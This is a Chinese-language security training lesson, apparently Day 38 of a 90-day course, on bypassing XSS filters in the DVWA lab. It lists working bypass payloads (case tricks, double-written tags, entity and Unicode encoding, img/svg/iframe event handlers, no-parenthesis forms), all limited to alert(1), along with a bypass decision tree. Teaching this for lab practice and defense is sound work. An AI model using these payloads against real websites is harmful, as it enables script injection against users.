---
title: Day038：XSS 进阶 - 绕过基础（编码与标签变形）
tags:
  - 网络安全
  - XSS
  - 绕过技巧
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d038
date: 2026-03-01
updated: 2026-01-28
---

# Day038：XSS 进阶 - 绕过基础（编码与标签变形）

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | XSS 绕过基础技巧 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你在测试一个网站，发现输入 `<script>alert(1)</script>` 被过滤成了空，页面没有任何反应。
>
> **问题**：网站过滤了 `<script>` 标签，怎么才能弹窗？
>
> **今天的任务**：学习 XSS 绕过的基础技巧——当正门被堵死，从窗户进去。

---

## 今日目标

- [ ] 理解 XSS 过滤的常见方式
- [ ] 掌握大小写绕过技巧
- [ ] 掌握编码绕过技巧
- [ ] 掌握标签变形绕过技巧

**闯关条件**：在过滤 `<script>` 的环境中成功弹窗。

---

## 实战任务（先动手！）

### 任务 1：分析过滤规则（15 分钟）

**环境**：DVWA - XSS (Reflected) - Medium/High

**操作步骤**：

1. 设置 Security Level 为 Medium
2. 输入 `<script>alert(1)</script>`，观察结果
3. 查看源代码，分析过滤逻辑

**记录**：
```
Medium 级别过滤了什么：________________
过滤方式（替换/删除/转义）：________________
```

---

### 任务 2：大小写绕过（15 分钟）

**原理**：某些过滤只匹配小写，HTML 标签不区分大小写

**Payload 示例**：
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
```

**操作**：
1. 在 Medium 级别尝试大小写变形
2. 观察是否成功弹窗

**记录**：
```
测试结果：________________
成功的 Payload：________________
```

---

### 任务 3：双写绕过（20 分钟）

**原理**：如果过滤是简单替换为空，双写可以绕过

**Payload 示例**：
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scrscriptipt>alert(1)</scrscriptipt>
```

**分析过程**：
```
原始：<scr<script>ipt>
过滤后：<script>  ← 删除中间的 <script> 后，前后拼接成新的 <script>
```

**记录**：
```
测试结果：________________
```

---

### 任务 4：编码绕过（30 分钟）

**HTML 实体编码**：
```html
<!-- 十进制实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- 十六进制实体 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- 混合编码 -->
<img src=x onerror=&#97;lert(1)>
```

**URL 编码**（适用于 URL 参数）：
```
%3Cscript%3Ealert(1)%3C/script%3E
```

**Unicode 编码**：
```javascript
\u0061lert(1)  // alert(1)
```

**记录**：
```
成功的编码方式：________________
Payload：________________
```

---

### 任务 5：替代标签绕过（30 分钟）

**`<script>` 被过滤？用其他标签！**

**事件触发型**：
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**SVG 标签**：
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
```

**iframe 标签**：
```html
<iframe src="javascript:alert(1)">
```

**记录**：
```
成功的替代标签：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解过滤原理 | 15 分 |
| 成功大小写绕过 | 20 分 |
| 成功双写绕过 | 15 分 |
| 成功编码绕过 | 25 分 |
| 成功标签替换绕过 | 25 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### XSS 过滤类型

| 过滤类型 | 实现方式 | 绕过思路 |
|----------|----------|----------|
| 黑名单替换 | `str_replace('script', '')` | 双写、大小写 |
| 正则过滤 | `preg_replace('/<script>/i', '')` | 标签变形、编码 |
| 白名单 | 只允许特定标签 | 找白名单内的危险属性 |
| 转义输出 | `htmlspecialchars()` | 几乎无法绕过（正确防御） |

### 编码对照表

| 字符 | HTML 十进制 | HTML 十六进制 | URL 编码 |
|------|-------------|---------------|----------|
| `<` | `&#60;` | `&#x3c;` | `%3C` |
| `>` | `&#62;` | `&#x3e;` | `%3E` |
| `'` | `&#39;` | `&#x27;` | `%27` |
| `"` | `&#34;` | `&#x22;` | `%22` |
| `/` | `&#47;` | `&#x2f;` | `%2F` |

### 常见事件属性

```
onload      - 页面/元素加载完成
onerror     - 资源加载失败
onclick     - 点击
onmouseover - 鼠标悬停
onfocus     - 获得焦点
onblur      - 失去焦点
onchange    - 内容改变
onsubmit    - 表单提交
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 编码后不执行 | Payload 被原样显示 | 确认编码位置正确（属性值 vs 标签） |
| 事件不触发 | 没弹窗 | 需要用户交互，用 autofocus 自动触发 |
| 引号被过滤 | 语法错误 | 用反引号或不用引号 |
| 括号被过滤 | alert(1) 失效 | 用模板字符串 `alert`1`` |

---

## 知识卡片速查

### XSS 绕过速查表

```html
# 大小写
<ScRiPt>alert(1)</ScRiPt>

# 双写
<scr<script>ipt>alert(1)</scr</script>ipt>

# 替代标签
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# 编码
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# 无引号
<img src=x onerror=alert(1)>

# 无括号
<img src=x onerror=alert`1`>

# 换行绕过正则
<img src=x one
rror=alert(1)>
```

### 绕过决策树

```
<script> 被过滤？
├── 尝试大小写 → <ScRiPt>
├── 尝试双写 → <scr<script>ipt>
└── 换其他标签 → <img> <svg> <body>
    ├── 事件被过滤？
    │   ├── 尝试编码 → &#111;nerror
    │   └── 换其他事件 → onload onfocus
    └── alert 被过滤？
        ├── prompt/confirm
        └── 编码 → \u0061lert
```

---

## 常见问题

**Q1：为什么 HTML 实体编码能绕过？**

A1：浏览器在解析 HTML 时会先解码实体，所以 `&#97;` 会被解析成 `a`。如果过滤发生在解码之前，编码后的内容就能绕过。

**Q2：什么情况下大小写绕过有效？**

A2：当过滤使用的是区分大小写的字符串匹配时有效（如 `str_replace('script', '')`）。如果用正则加了 `i` 标志，大小写绕过无效。

**Q3：为什么有些编码在 URL 中有效，在 HTML 中无效？**

A3：不同上下文使用不同的解码规则：
- URL 参数：服务器会 URL 解码
- HTML 内容：浏览器会 HTML 实体解码
- JavaScript：JS 引擎会 Unicode 解码

---

## 明日预告

**Day 039：XSS 进阶 - 绕过进阶（事件属性与特殊标签）**

明天你将：
- 学习更多事件属性的利用
- 掌握 SVG、MathML 等特殊标签
- 学习 Mutation XSS（mXSS）

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功的绕过方式 | |
| 最有效的 Payload | |
| 今日收获 | |

---

> **导师点评**：
>
> XSS 绕过就像是"文字游戏"——过滤规则写的是"不许说 script"，那我就说"SCRIPT"、"scr ipt"、"s.c.r.i.p.t"。
>
> 记住：**防御者要堵住所有漏洞，攻击者只需找到一个**。
>
> 今天学的是基础绕过，足以应对大部分简单过滤。但真正的挑战是 WAF 和 CSP——那才是硬骨头。
>
> **先把基础练熟，别急着上高难度**。

```bash
echo "Day 038 Complete! XSS 绕过入门！"
```
